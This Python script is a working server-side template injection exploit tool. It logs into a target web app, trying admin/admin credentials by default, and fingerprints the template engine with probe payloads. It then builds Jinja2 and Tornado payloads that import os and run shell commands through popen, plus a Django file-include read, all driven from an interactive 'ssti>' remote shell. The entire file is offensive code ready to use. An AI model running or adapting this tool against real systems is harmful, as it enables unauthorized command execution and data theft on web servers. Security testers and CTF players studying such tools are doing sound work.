#!/usr/bin/env python3
import requests
import argparse
import sys
import re

DELIM_START = "===SSTI_START==="
DELIM_END = "===SSTI_END==="

SSTI_TEST_PAYLOADS = {
    "jinja2": {
        "payload": "{{ namespace().__class__.__name__ }}",
        "indicator": "Namespace",
    },
    "tornado": {
        "payload": "{% for i in range(3) %}{{ i }}{% endfor %}",
        "indicator": "012",
    },
    "django": {
        "payload": "{{ 7|add:7 }}",
        "indicator": "14",
    },
    "erb": {
        "payload": "<%= 7*7 %>",
        "indicator": "49",
    },
    "twig": {
        "payload": "{{ ['a','b']|join(',') }}",
        "indicator": "a,b",
    },
}

SUPPORTED_ENGINES = ["jinja2", "tornado", "django"]

class SSTIExploit:
    def __init__(self, url):
        self.url = url.rstrip("/") + "/"
        self.session = requests.Session()
        self.engine = None

    # ---------- AUTH ----------
    def login(self, username="admin", password="admin"):
        print(f"[*] Logging in with {username} and {password}")

        r = self.session.get(self.url + "login", timeout=10)
        xsrf = self.session.cookies.get("_xsrf")

        if not xsrf:
            raise Exception("[-] XSRF token not found")

        data = {
            "username": username,
            "password": password,
            "_xsrf": xsrf
        }
        headers = {"X-XSRFToken": xsrf}

        self.session.post(
            self.url + "login",
            data=data,
            headers=headers,
            allow_redirects=True,
            timeout=10
        )

        print("[DEBUG] Cookies:", self.session.cookies.get_dict())

        r2 = self.session.get(self.url, timeout=10)
        if "login" in r2.text.lower():
            raise Exception("[-] Login failed")

        print("[+] Login successful")

    # ---------- DETECTION ----------
    def test_ssti(self, parameter):
        print("[*] Running SSTI detection payloads")

        try:
            r = self.session.get(
                self.url,
                params={parameter: "{{7*7}}"},
                timeout=5
            )
        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return None

        if "49" not in r.text:
            print("[-] No SSTI detected with baseline payload")
            return None

        print("[+] SSTI baseline detected ({{7*7}} = 49)")

        for engine, test in SSTI_TEST_PAYLOADS.items():
            try:
                r = self.session.get(
                    self.url,
                    params={parameter: test["payload"]},
                    timeout=5
                )
                if test["indicator"] in r.text:
                    print(f"[+] Engine identified: {engine}")
                    return engine
            except requests.exceptions.RequestException as e:
                print(f"[!] Error testing {engine}: {e}")

        print("[+] SSTI confirmed but engine could not be identified")
        return "unknown"

    # ---------- PAYLOADS ----------
    def build_payloads(self, engine, cmd):
        cmd_repr = repr(cmd)
        wrapped = f"{DELIM_START}{{{{OUTPUT}}}}{DELIM_END}"

        if engine == "jinja2":
            return [
                wrapped.replace(
                    "{{OUTPUT}}",
                    f"{{{{request.application.__globals__.__builtins__.__import__('os').popen({cmd_repr}).read()}}}}"
                )
            ]

        elif engine == "tornado":
            return [
                wrapped.replace(
                    "{{OUTPUT}}",
                    '{{% import os %}}{{{{ os.popen({cmd}).read() }}}}'.format(cmd=cmd_repr)
                )
            ]

        elif engine == "django":
            # Django SSTI doesn't easily allow RCE — use file read via include
            return [
                wrapped.replace(
                    "{{OUTPUT}}",
                    "{{% include '{cmd}' %}}".format(cmd=cmd)
                )
            ]

        else:
            print(f"[-] No exploit payload available for engine: {engine}")
            return []

    def encode_payload(self, payload, method):
        if method == "url":
            return requests.utils.quote(payload)
        elif method == "double":
            return requests.utils.quote(requests.utils.quote(payload))
        return payload

    # ---------- EXPLOIT ----------
    def exploit(self, method="GET", parameter="name", cmd="id", encoding="none"):
        if not self.engine:
            raise RuntimeError("SSTI engine not set")

        payloads = self.build_payloads(self.engine, cmd)

        if not payloads:
            return None

        for payload in payloads:
            encoded = self.encode_payload(payload, encoding)
            try:
                if method == "GET":
                    r = self.session.get(
                        self.url,
                        params={parameter: encoded},
                        timeout=30
                    )
                elif method == "POST":
                    r = self.session.post(
                        self.url,
                        data={parameter: encoded},
                        timeout=30
                    )
                else:
                    raise ValueError(f"Unsupported HTTP method: {method}")

                output = self.extract_output(r.text)
                if output:
                    return output

            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")

        print("[-] Command execution failed")
        return None

    # ---------- OUTPUT PARSING ----------
    def extract_output(self, text):
        match = re.search(
            f"{DELIM_START}(.*?){DELIM_END}",
            text,
            re.DOTALL
        )
        return match.group(1).strip() if match else None


# ---------- MAIN ----------
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Target base URL")
    parser.add_argument("parameter", help="Injectable parameter")

    parser.add_argument(
        "--login",
        action="store_true",
        help="Perform login before exploitation"
    )
    parser.add_argument("--username", help="Username for login")
    parser.add_argument("--password", help="Password for login")

    parser.add_argument(
        "--engine",
        help=f"Force SSTI engine ({', '.join(SSTI_TEST_PAYLOADS.keys())})"
    )
    parser.add_argument(
        "--method",
        default="GET",
        choices=["GET", "POST"],
        help="HTTP method (GET, POST)"
    )
    parser.add_argument(
        "--encode",
        default="none",
        choices=["none", "url", "double"],
        help="Encoding method"
    )

    args = parser.parse_args()
    exploit = SSTIExploit(args.url)

    if args.login:
        username = args.username or "admin"
        password = args.password or "admin"
        try:
            exploit.login(username, password)
        except Exception as e:
            print(e)
            sys.exit(1)

    print("[*] Testing for SSTI...")

    # ---------- ENGINE SELECTION ----------
    if args.engine:
        exploit.engine = args.engine.lower()
        print(f"[+] SSTI engine forced: {exploit.engine}")
    else:
        exploit.engine = exploit.test_ssti(args.parameter)

    if exploit.engine is None:
        print("[-] SSTI not detected")
        sys.exit(1)

    if exploit.engine not in SUPPORTED_ENGINES:
        print(f"[!] Engine '{exploit.engine}' detected but no RCE payload available")
        sys.exit(1)

    if exploit.engine == "django":
        print("[!] Note: Django SSTI uses file inclusion rather than RCE — enter file paths as commands")

    print(f"[+] SSTI confirmed ({exploit.engine}), entering interactive shell")

    # ---------- INTERACTIVE LOOP ----------
    while True:
        try:
            cmd = input("ssti> ").strip()
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit"):
                break

            output = exploit.exploit(args.method, args.parameter, cmd, args.encode)
            if output:
                print(output)
            else:
                print("[-] No output")

        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            break

        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
